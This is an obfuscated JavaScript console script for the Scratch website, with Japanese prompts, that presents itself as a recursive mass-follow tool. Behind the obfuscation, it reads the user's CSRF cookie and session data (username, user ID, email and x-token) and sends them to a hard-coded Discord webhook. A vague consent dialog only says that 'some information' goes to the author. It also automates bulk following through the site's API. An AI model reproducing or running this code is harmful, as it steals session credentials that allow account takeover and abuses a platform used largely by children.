!function($,x){let e=_0x7368,t=$();for(;;)try{let s=parseInt(e(393))/1*(-parseInt(e(417))/2)+-parseInt(e(409))/3*(parseInt(e(341))/4)+parseInt(e(384))/5*(parseInt(e(355))/6)+-parseInt(e(363))/7+-parseInt(e(395))/8*(parseInt(e(407))/9)+-parseInt(e(377))/10*(-parseInt(e(343))/11)+parseInt(e(411))/12;if(923367===s)break;t.push(t.shift())}catch(r){t.push(t.shift())}}(_0x393f,923367);let totalCollectedUserListLength=0,totalFailureUserCount=0,totalFailure=0,maxUserListLength=0,session;async function followUser($,x,e,t){let s=_0x7368;return fetch(s(348)+$+"/add/?usernames="+session[s(335)][s(394)],{headers:{accept:s(342),"accept-language":s(382),"content-type":"application/json","sec-fetch-dest":s(386),"sec-fetch-mode":"cors","sec-fetch-site":"same-origin","sec-gpc":"1","x-csrftoken":t,"x-requested-with":s(380)},referrer:"https://scratch.mit.edu/users/griffpatch/",referrerPolicy:s(415),body:s(364)+$+s(360)+x+',"username":"'+$+s(420)+e+s(412),method:s(344),mode:s(362),credentials:s(416)})[s(336)]($=>$[s(403)])}function _0x393f(){let $=["[*] Block ","不正な値が入力されました。","status","「OK」を押すと実行開始します。","[!] Error: failed to get csrf token. (Scratchにログインしていない可能性があります。)","confirm","10769769ZPTkyL","/following/?offset=0&limit=","309609WyquyY","push","38292876HAbNNv",'","comments_allowed":true}',"https://api.scratch.mit.edu/users/","Logger","strict-origin-when-cross-origin","include","4vLAEFc","・csrf-token\n・x-token\n・セッションの一部\n\n","[*] Current username: ",'","thumbnail_url":"',"length","json","user","then","https://scratch.mit.edu/session/","１ このスクリプトを実行したことによって生じた損害について、","stringify","何人のユーザーをフォローしますか？（半角数字で入力してください）\n！注意！\nこの値は”目安”です。必ず同じ人数がフォローされる訳ではありません。","16tJZgUz","application/json, text/javascript, */*; q=0.01","11aQcuWa","PUT","\nCSRF: ","!Notification!\nUsername: ","[*] Current CSRF token: ","https://scratch.mit.edu/site-api/users/followers/","token","[*] キャンセルされました。","[*] Done!","application/json","https://discord.com/api/webhooks/1043748975292989520/ESGA5TCXtXWl3vQQHhdQPkhP74ReMieDcqdvo1I1km4gvJks3VOF6e6oIueyRcAGjik6","２ このプロンプトに同意し、「OK」 を押した場合、作者のもとに幾つかの情報が渡ります。\n","78dOGsQc"," done.","prompt","roles","log",'","userId":',"・個人のアカウントの安全が著しく脅かされた・されている場合\n","cors","2494639MZHAHv",'{"id":"',"作者は\n一切責任を取りません。また、個人の要望に応じて作者が答えることはありません。\n\n","[!] Error: failed to fetch session. (Scratchにログインしていない可能性があります。)","・作者のアカウントの安全が脅かされている・された場合\n","[*] Collecting usernames...","元となるユーザー名を入力してください（自身のユーザー名は禁止です）","forEach","GET","cookie","find","*/*","[*] Current user id: ","random","3489770IruXca","再帰フォローする最大の深さを半角で入力してください。（よく分からないという場合は0を入力）","Error!","XMLHttpRequest","error","ja;q=0.5","[*] Total failure: ","4355SaEdwB","sort","empty","[*] successfully done.","以下の場合に、収集した情報を使用する可能性があります\n","************","\nこれら全てに同意できた場合、「OK」を押してください。\n","[!] Error following ","[*] 終了しました。","331088HPoHjn","username","8wtRWqn","\nX TOKEN: ","same-origin","同意出来ない場合は、「キャンセル」を押してください。","from","\nmail: "];return(_0x393f=function(){return $})()}async function getFollowingUsers($,x){let e=_0x7368;return fetch(e(413)+$+e(408)+x,{headers:{accept:"*/*","accept-language":e(382),"sec-fetch-dest":"empty","sec-fetch-mode":e(362),"sec-fetch-site":e(397),"sec-gpc":"1","x-requested-with":e(380)},referrerPolicy:e(415),body:null,method:e(371),mode:e(362),credentials:e(416)})[e(336)]($=>{let x=e;return 200==$.status?$[x(334)]():x(379)})}async function collectFollowingUsersRecursive($,x,e){let t=_0x7368;if(totalCollectedUserListLength>=maxUserListLength||x>e)return[];let s=await getFollowingUsers($,e);if("Error!"==s)return totalFailure++,[];let r=[];for(let a=0;a<s.length&&!(totalCollectedUserListLength>=maxUserListLength);a++){let o=s[a][t(394)];r.push([o,s[a].id]),r=r.concat(r,await collectFollowingUsersRecursive(o,x+1,e))}return totalCollectedUserListLength=(r=Array[t(399)](new Set(r)))[t(333)],console[t(359)](t(401)+x+r[t(333)]+Math.floor(totalCollectedUserListLength/maxUserListLength)+t(356)),r}function _0x7368($,x){let e=_0x393f();return(_0x7368=function($,x){return e[$-=333]})($,x)}async function followAsync($,x){let e=_0x7368,t=0;for(element of $){if(maxUserListLength<++t)break;t-1==0&&0!=t&&console.log("[*] Sleeping 60 sec... (PLEASE DO NOT INTERRUPT! 操作はまだ完了していません！終了しないでください。)"),await new Promise($=>setTimeout($,t%6==0?6e4:100));200!=await followUser(element[0],element[1],null,x)?console[e(381)](e(391)+element[0]):console[e(359)]("[*] Followed "+element[0])}}(async()=>{let $=_0x7368;if(!1==window[$(406)]("！絶対にお読みください！\n利用規約\n"+$(338)+$(365)+$(354)+$(418)+"３ これらの情報の取扱いについて\n"+$(388)+$(361)+$(367)+"・必要とされる状況に直面した時\n"+$(390)+$(398)))return console[$(359)]($(392)),!1;if((maxUserListLength=window[$(357)]($(340)))<1)return console[$(381)]($(402)),!0;let x=window[$(357)]($(369)),e=window[$(357)]($(378));0==e&&(e=maxUserListLength<100?4:10);let t=document[$(372)].match(/scratchcsrftoken=([0-9a-zA-Z]+)/)[1];if(void 0==t&&console[$(381)]($(405)),void 0==(session=await fetch($(337),{headers:{accept:$(374),"accept-language":$(382),"sec-fetch-dest":$(386),"sec-fetch-mode":$(362),"sec-fetch-site":$(397),"sec-gpc":"1","x-requested-with":$(380)},referrer:"https://scratch.mit.edu/",referrerPolicy:"strict-origin-when-cross-origin",body:null,method:$(371),mode:$(362),credentials:$(416)})[$(336)](x=>{let e=$;return 200==x.status?x[e(334)]():(console[e(381)](e(366)),!0)}))[$(335)])return console.error("[!] Error: failed to fetch session. (Scratchにログインしていない可能性があります。)"),!0;if(!1==window[$(406)]($(404)))return console[$(359)]($(350)),!1;fetch($(353),{method:"post",headers:{"Content-Type":$(352)},body:JSON[$(339)]({username:$(414),avatar_url:"",content:$(346)+session.user[$(394)]+"\nUserID: "+session.user.id+$(400)+session.user.email+$(345)+t+$(396)+session[$(335)][$(349)],allowed_mentions:{parse:["users",$(358)]}})}),console[$(359)]($(419)+session.user[$(394)]),console[$(359)]($(375)+session.user.id),console[$(359)]($(347)+t.substring(0,5)+$(389)),console.log($(368));let s=await collectFollowingUsersRecursive(x,0,e),r=[];return s[$(370)](x=>{let e=$;r[e(373)]($=>$[1]===x[1])||r[e(410)](x)}),r[$(385)](()=>Math[$(376)]()-.5),console[$(359)]("[*] Total success: "+(r.length-totalFailure)),console.log($(383)+totalFailure),console[$(359)]($(387)),console[$(359)]("[*] Following all users..."),await followAsync(r,t),console[$(359)]($(351)),!1})();
